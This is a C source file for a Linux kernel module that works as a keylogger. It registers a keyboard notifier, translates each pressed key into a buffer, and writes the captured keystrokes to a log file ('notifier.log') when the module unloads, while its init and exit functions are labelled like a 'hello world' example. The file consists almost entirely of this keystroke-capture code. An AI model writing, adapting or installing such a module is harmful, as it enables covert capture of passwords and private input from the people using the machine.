#include <linux/init.h>
#include <linux/module.h>

#include "headers/keysym.h"
#include "headers/kfile.h"

#define LOG_PATH "notifier.log"

int kstroke_handler(struct notifier_block *, unsigned long, void *);

//notifier block for kbd_listener
static struct notifier_block nb = {
  .notifier_call = kstroke_handler
};

//buffer for translated key symbols
static char trans[BUFLEN];

//log file
static struct file *log;

/*Called when a key is pressed.
 *Translates the keystroke into a string and writes the string to our log file.
 *
 *Parameters:
 *  nb    - notifier block we registered with
 *  mode  - keyboard mode
 *  param - keyboard_notifier_param with keystroke data
 *
 *Returns:
 *  zero (call me lazy)
 */
int kstroke_handler(struct notifier_block *nb,
                    unsigned long mode, void *param) {

  keystroke_data *keystroke = param;

  switch (mode) {
    case KBD_KEYCODE : break;
      //ignore keycodes.
      //we'll grab keys further down (once the kernel has done some work for
      //us.)
    case KBD_UNBOUND_KEYCODE:
      printk(KERN_ALERT "Unbound\n"); break;
    case KBD_UNICODE :
      printk(KERN_ALERT "Unicode   : %x\n", keystroke->value); break;
    case KBD_KEYSYM :
      xlate_keysym(keystroke, trans);
      break;
    case KBD_POST_KEYSYM : break;
    default :
      printk(KERN_ALERT "Really not sure what happend\n"); break;
  }

  return 0;
}

static int hello_init(void) {
  printk(KERN_ALERT "Hello, world!\n");

  //notice when a key is pressed?  yes, please!
  register_keyboard_notifier(&nb);

  return 0;
}

static void hello_exit(void) {

  //unregister kbd_listener
  unregister_keyboard_notifier(&nb);

  //write keystrokes into the log file
  log = kopen(LOG_PATH, O_WRONLY|O_CREAT|O_APPEND, 0644);
  kwrite(log, 0, trans, strlen(trans));
  kclose(log);

  printk(KERN_ALERT "Goobye, world!\n");
}

MODULE_LICENSE("GPL");
module_init(hello_init);
module_exit(hello_exit);

